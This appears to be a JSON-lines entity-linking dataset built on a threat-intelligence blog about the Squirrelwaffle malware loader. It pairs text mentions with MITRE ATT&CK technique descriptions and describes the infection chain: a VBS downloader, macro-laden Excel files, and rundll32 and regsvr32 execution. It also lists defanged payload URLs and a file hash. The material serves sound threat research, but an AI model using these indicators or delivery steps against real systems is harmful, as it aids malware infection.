{"mention": "Squirrelwaffle", "context_left": "![Figure 4: Example VBS code that downloads and executes the", "context_right": "loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "_context_left": "![Figure 4: Example VBS code that downloads and executes the ", "_context_right": " loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "sentence_left": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "sentence_right": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/vbs%20file.PNG)", "_context_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/vbs%20file.PNG)", "sentence_left": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "sentence_right": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Example VBS code that downloads and executes the", "context_left": "![Figure 4:", "context_right": "Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "_context_left": "![Figure 4: ", "_context_right": " Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "sentence_left": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "sentence_right": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "/vbs", "context_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle", "context_right": "%20file.PNG)", "_context_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle", "_context_right": "%20file.PNG)", "sentence_left": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "sentence_right": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "executes", "context_left": "Figure 4: Example VBS code that downloads and", "context_right": "the Squirrelwaffle loader.", "_context_left": "Figure 4: Example VBS code that downloads and ", "_context_right": " the Squirrelwaffle loader.", "sentence_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "sentence_right": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 4: Example VBS code that downloads and executes the", "context_right": "loader.", "_context_left": "Figure 4: Example VBS code that downloads and executes the ", "_context_right": " loader.", "sentence_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "sentence_right": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Example VBS code that downloads and executes the Squirrelwaffle loader.", "context_left": "Figure 4:", "context_right": "", "_context_left": "Figure 4: ", "_context_right": "", "sentence_left": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "sentence_right": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Example (sanitized) URLs that were used to retrieve", "context_right": "are shown below:", "_context_left": "Example (sanitized) URLs that were used to retrieve ", "_context_right": " are shown below:", "sentence_left": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "sentence_right": "*hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html*", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the", "context_right": "payloads have been downloaded", "_context_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the ", "_context_right": " payloads have been downloaded", "sentence_left": "*hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html*", "sentence_right": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "VBS script is executed", "context_left": "Figure 5 shows the ProgramData folder after the", "context_right": "and the Squirrelwaffle payloads have been downloaded", "_context_left": "Figure 5 shows the ProgramData folder after the ", "_context_right": " and the Squirrelwaffle payloads have been downloaded", "sentence_left": "*hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html*", "sentence_right": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle payloads have been downloaded", "context_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the", "context_right": "", "_context_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the ", "_context_right": "", "sentence_left": "*hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html*", "sentence_right": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the", "context_right": "loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "_context_left": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the ", "_context_right": " loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "sentence_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded", "sentence_right": "Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "_context_left": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "sentence_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded", "sentence_right": "Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "pin.vbs file has been executed and downloaded", "context_left": "![Figure 5: Disk artifacts after the", "context_right": "the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "_context_left": "![Figure 5: Disk artifacts after the ", "_context_right": " the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "sentence_left": "Figure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded", "sentence_right": "Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the", "context_right": "loader DLL.", "_context_left": "Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the ", "_context_right": " loader DLL.", "sentence_left": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "sentence_right": "The threat actor behind these campaigns has changed some of their TTPs over time.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "pin.vbs file has been executed and downloaded the Squirrelwaffle", "context_left": "Figure 5: Disk artifacts after the", "context_right": "loader DLL.", "_context_left": "Figure 5: Disk artifacts after the ", "_context_right": " loader DLL.", "sentence_left": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "sentence_right": "The threat actor behind these campaigns has changed some of their TTPs over time.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "used hidden Microsoft Excel sheets with an *Auto\\_Open()* macro,", "context_left": "Recently, the initial infection vector has", "context_right": "which downloads the Squirrelwafle loader from three different URLs.", "_context_left": "Recently, the initial infection vector has ", "_context_right": " which downloads the Squirrelwafle loader from three different URLs.", "sentence_left": "The threat actor behind these campaigns has changed some of their TTPs over time.", "sentence_right": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "The", "context_right": "loader is subsequently executed via regsvr32.exe.", "_context_left": "The ", "_context_right": " loader is subsequently executed via regsvr32.exe.", "sentence_left": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an *Auto\\_Open()* macro, which downloads the Squirrelwafle loader from three different URLs.", "sentence_right": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "loader is subsequently executed via regsvr32.exe.", "context_left": "The Squirrelwaffle", "context_right": "", "_context_left": "The Squirrelwaffle ", "_context_right": "", "sentence_left": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an *Auto\\_Open()* macro, which downloads the Squirrelwafle loader from three different URLs.", "sentence_right": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 6: Microsoft Excel with a malicious macro used to deliver", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "_context_left": "![Figure 6: Microsoft Excel with a malicious macro used to deliver ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "sentence_left": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.", "sentence_right": "Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/xls.PNG)", "_context_left": "![Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/xls.PNG)", "sentence_left": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.", "sentence_right": "Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Microsoft Excel with a malicious macro used to deliver", "context_left": "![Figure 6:", "context_right": "Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "_context_left": "![Figure 6: ", "_context_right": " Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "sentence_left": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.", "sentence_right": "Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 6: Microsoft Excel with a malicious macro used to deliver", "context_right": "", "_context_left": "Figure 6: Microsoft Excel with a malicious macro used to deliver ", "_context_right": "", "sentence_left": "![Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "sentence_right": "The hidden sheet in this Excel document is shown in Figure 7.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Microsoft Excel with a malicious macro used to deliver Squirrelwaffle", "context_left": "Figure 6:", "context_right": "", "_context_left": "Figure 6: ", "_context_right": "", "sentence_left": "![Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "sentence_right": "The hidden sheet in this Excel document is shown in Figure 7.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
